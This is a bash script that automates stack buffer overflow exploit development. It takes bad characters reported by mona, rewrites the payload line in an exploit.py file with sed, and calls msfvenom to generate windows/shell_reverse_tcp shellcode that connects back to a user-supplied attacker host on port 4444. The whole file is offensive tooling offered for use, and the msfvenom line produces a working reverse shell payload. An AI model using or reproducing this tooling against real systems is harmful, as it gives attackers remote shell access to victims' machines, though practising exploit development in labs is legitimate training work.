#!/bin/bash

echo "Note: Provide empty inputs to generate a full characterset payload."
read -a badchars -p 'Specify outlying bad characters (from mona): ' 
read -a lhost -p 'Specify lhost (for venom): '

echo "[+] Generating txt files for reporting {1_fuzzing_result.txt, 2_pattern_offset_result.txt, 3_bad_characters_result.txt, 4_jmp_address_results.txt}"
touch 1_fuzzing_result.txt 2_pattern_offset_result.txt 3_bad_characters_result.txt 4_jmp_address_results.txt

if [ -z "$badchars" ]
then
echo "[+] Full bad characterset payload: "
echo "payload = \"$(python2 badcharset.py)\""

echo "[+] Modifying exploit.py payload with full characterset..."
cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
replacement=$(echo -E "payload = \"$(python2 badcharset.py)\"" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}' ) 
sed -i "/payload = \"\"/c $replacement" exploit.py
fi

if [ -n "$badchars" ]
then
    echo -n "[+] Bad character shellcode: "
    bc="$(echo ${badchars[@]} | sed 's/ /\\x/g' | sed 's/^/\\x/g' | tr '' '\n')"
    echo "$bc"

    echo "[+] Bad character deduction: "
    pattern=$(for i in ${badchars[@]}; do echo -n "s+x$i\\\++g; " ; done)
    badcharsreplacement=$(echo -E "payload = \"$(python2 badcharset.py)\"" | sed "$pattern" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}')
    echo $badcharsreplacement

    echo "[+] Modifying exploit.py payload with characterset without bad characters..."
    cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
    sed -i "/payload = \"\"/c $badcharsreplacement" exploit.py

    echo -n "[+] msfvenom output: "
    echo "$(msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread -b $bc -f c)"

fi